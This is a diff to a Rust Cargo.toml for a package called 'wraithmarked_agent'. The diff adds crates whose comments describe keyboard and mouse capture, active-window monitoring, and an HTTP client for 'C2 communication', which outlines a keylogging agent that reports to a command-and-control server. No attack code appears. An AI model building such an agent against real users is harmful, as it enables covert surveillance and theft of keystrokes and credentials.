@@ -1,6 +1,35 @@
 [package]
 name = "wraithmarked_agent"
 version = "0.1.0"
-edition = "2024"
+edition = "2021"
+
+# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html
+
 
 [dependencies]
+# For date/time handling and serialization
+chrono = { version = "0.4", features = ["serde"] }
+
+# For serialization/deserialization (JSON)
+serde = { version = "1.0", features = ["derive"] }
+serde_json = "1.0"
+
+# For logging (info!, error!, etc.)
+log = "0.4"
+env_logger = "0.11"
+
+# For low-level input event capturing (keyboard, mouse)
+rdev = "0.5"
+
+# For active window monitoring (cross-platform)
+x-win = "5.1.0"
+
+# For HTTP client (C2 communication)
+reqwest = { version = "0.11", features = ["json", "blocking"] }
+tokio = { version = "1", features = ["full"] }
+
+# For handling Ctrl+C signals for graceful shutdown
+ctrlc = "3.4"
+
+# xcap = "0.6.1"
+# active-win-pos-rs = "0.9.0" # Replaced by x-win
